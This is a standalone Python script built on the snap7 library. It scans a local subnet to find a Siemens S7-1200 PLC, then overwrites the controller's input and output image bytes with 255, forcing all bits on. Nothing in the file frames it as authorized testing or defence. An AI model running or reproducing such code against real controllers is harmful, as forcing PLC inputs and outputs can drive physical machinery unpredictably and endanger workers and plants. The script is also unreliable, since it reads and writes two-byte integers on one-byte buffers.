import snap7
from snap7.util import *
from snap7.types import *
import socket

def find_plc_ip():
    """
    Scans the local network to find the PLC's IP address.
    This is a simple implementation and may need adjustments based on the network setup.
    """
    import ipaddress
    import subprocess

    network = ipaddress.ip_network('192.168.1.0/24', strict=False)  # Adjust the network range as needed
    for ip in network.hosts():
        ip = str(ip)
        try:
            # Ping the IP address to check if it is reachable
            subprocess.check_output(['ping', '-n', '1', '-w', '1', ip], stderr=subprocess.STDOUT)
            print(f"Found active IP: {ip}")
            # Attempt to connect to the PLC using snap7
            plc = snap7.client.Client()
            plc.connect(ip, 0, 1)
            if plc.get_connected():
                print(f"PLC found at IP: {ip}")
                plc.disconnect()
                return ip
        except Exception as e:
            continue
    raise Exception("PLC IP address not found on the network.")

def manipulate_io_image(plc_ip):
    """
    Manipulates the I/O image of the Siemens S7-1200 PLC by overriding input/output values.
    """
    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1)

    if not plc.get_connected():
        raise Exception("Failed to connect to the PLC.")

    try:
        # Read the current input image (IB0)
        input_image = plc.read_area(Areas.PE, 0, 0, 1)  # PE = Process Inputs, 0 = byte offset, 1 = byte count
        print(f"Current Input Image (IB0): {get_int(input_image, 0)}")

        # Override the input image (force a specific value)
        new_input_value = 255  # Example: Set all bits to 1
        set_int(input_image, 0, new_input_value)
        plc.write_area(Areas.PE, 0, 0, input_image)
        print(f"Overridden Input Image (IB0): {get_int(input_image, 0)}")

        # Read the current output image (QB0)
        output_image = plc.read_area(Areas.PA, 0, 0, 1)  # PA = Process Outputs, 0 = byte offset, 1 = byte count
        print(f"Current Output Image (QB0): {get_int(output_image, 0)}")

        # Override the output image (force a specific value)
        new_output_value = 255  # Example: Set all bits to 1
        set_int(output_image, 0, new_output_value)
        plc.write_area(Areas.PA, 0, 0, output_image)
        print(f"Overridden Output Image (QB0): {get_int(output_image, 0)}")

    finally:
        plc.disconnect()

if __name__ == "__main__":
    try:
        plc_ip = find_plc_ip()
        print(f"PLC IP Address: {plc_ip}")
        manipulate_io_image(plc_ip)
    except Exception as e:
        print(f"Error: {e}")